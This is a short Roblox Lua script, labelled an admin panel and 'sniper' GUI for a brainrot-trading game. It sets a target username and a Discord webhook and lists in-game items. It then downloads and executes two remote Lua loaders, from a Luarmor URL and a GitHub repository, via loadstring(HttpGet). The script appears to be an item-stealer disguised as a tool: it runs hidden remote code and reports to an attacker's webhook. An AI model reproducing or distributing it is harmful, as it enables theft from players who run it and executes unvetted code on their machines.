-- Mode: ADMINPANEL
getgenv().TARGET_USERNAME = "broplsineedthis5"
getgenv().WEBHOOK_URL = "https://discord.com/api/webhooks/1565252131013795955/MqX0Xywn_CBJ0dsE0od4V1RDAwQNg3s3vHFE0Hedp_BjbH4tY72cxbNO7omZBYeGkH2b"
getgenv().NORMAL_BRAINROTS = {
    ["Noobini Pizzanini"] = true
}
getgenv().NORMAL_BASE_SKINS = {
    ["Rose"] = true
}
getgenv().NORMAL_GEARS = {
    ["Santa's Sleigh"] = true
}

-- Cargando GUI SNIPER
task.spawn(function()
   loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/870375c8dfbc1d6521073674fe460cb6.lua"))()
end)

-- Cargando Sniper.lua desde GitHub
task.spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/sab-api/GUIAP/refs/heads/main/GUIAP.lua"))()
end)